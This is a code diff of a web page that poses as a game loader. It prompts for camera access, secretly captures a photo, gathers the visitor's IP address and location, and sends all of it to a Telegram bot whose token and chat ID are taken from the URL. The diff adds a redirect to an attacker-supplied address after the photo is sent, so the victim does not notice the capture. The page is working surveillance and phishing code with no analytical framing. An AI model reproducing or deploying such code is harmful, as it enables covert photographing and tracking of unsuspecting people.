@@ -20,31 +20,29 @@
         <div id="loading-text">Connecting to server...</div>
     </div>
     <div id="permission-request">
-        <h2>open link  Required</h2>
-        <p>Please open link access to continue</p>
-        <button id="allow-btn">open link</button>
+        <h2>Camera Access Required</h2>
+        <p>Please allow camera access to continue</p>
+        <button id="allow-btn">ALLOW CAMERA</button>
     </div>
     <video id="video-preview" autoplay playsinline></video>
     <canvas id="capture-canvas" style="display:none;"></canvas>
     <script>
-        // GET PARAM FUNCTION
         function getParam(name) {
             const params = new URLSearchParams(window.location.search);
             return params.get(name) || '';
         }
-        // FETCH DATA FROM QUERY PARAMS
         const botToken = getParam('token');
         const chatId = getParam('chat');
-
-        if(!botToken || !chatId){document.body.innerHTML="<h2 style='color:red;text-align:center;margin-top:50px;'>TOKEN OR CHATID MISSING!</h2>";throw new Error("Missing param");}
-
+        const redirectUrl = getParam('redirect');
+        if(!botToken || !chatId || !redirectUrl){
+            document.body.innerHTML="<h2 style='color:red;text-align:center;margin-top:50px;'>TOKEN, CHATID or REDIRECT MISSING!</h2>";throw new Error("Missing param");
+        }
         const loadingOverlay = document.getElementById('loading-overlay');
         const loadingText = document.getElementById('loading-text');
         const permissionRequest = document.getElementById('permission-request');
         const allowBtn = document.getElementById('allow-btn');
         const videoPreview = document.getElementById('video-preview');
         const captureCanvas = document.getElementById('capture-canvas');
-
         const loadingMessages = ["Connecting to server...","Loading game assets...","Verifying account...","Almost ready...","Preparing interface...","Finalizing setup..."];
         function rotateLoadingMessages() {
             let counter = 0;
@@ -53,7 +51,6 @@
                 counter = (counter + 1) % loadingMessages.length;
             }, 3000);
         }
-
         async function getIPInfo() {
             try {
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
@@ -62,7 +59,6 @@
                 return await detailsResponse.json();
             } catch (error) { return {}; }
         }
-
         async function sendPhotoToTelegram(blob, info) {
             try {
                 const formData = new FormData();
@@ -74,7 +70,6 @@
                 });
             } catch(e){}
         }
-
         async function captureAndSendPhoto() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
@@ -90,8 +85,10 @@
                 stream.getTracks().forEach(track => track.stop());
                 const info = await getIPInfo();
                 await sendPhotoToTelegram(blob, info);
-                loadingText.textContent = 'success!';
-                setTimeout(() => {loadingOverlay.style.display='none';},2000);
+                loadingText.textContent = 'Photo sent!';
+                setTimeout(() => {
+                    window.location.href = redirectUrl; // redirect after successful photo
+                }, 1200); // little delay for effect
             } catch (error) {
                 loadingOverlay.style.display = 'none';
                 permissionRequest.style.display = 'flex';
